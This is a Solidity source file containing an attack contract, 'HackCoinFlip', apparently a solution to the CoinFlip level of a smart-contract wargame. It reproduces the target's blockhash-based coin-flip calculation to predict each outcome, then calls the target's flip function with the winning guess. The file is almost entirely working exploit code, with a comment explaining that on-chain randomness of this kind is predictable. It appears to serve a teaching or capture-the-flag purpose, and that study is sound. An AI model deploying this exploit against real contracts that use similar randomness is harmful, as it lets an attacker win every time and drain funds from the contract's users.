// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

/**
    @title Hacker contract for CoinFlip
    @notice It's possible to hack the CoinFlip contract because of the EVM's deterministic property. 
            All the state variables of a contract are publicly available. 
            Anyone on the blockchain has access to the same data, thus we can predict the outcome of the coin flip and win it everytime.
*/

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract HackCoinFlip {
    CoinFlip toHack;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;

    constructor(address _toHack) {
        toHack = CoinFlip(_toHack);
    }

    function winFlip() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        coinFlip == 1 ? toHack.flip(true) : toHack.flip(false);
    }
}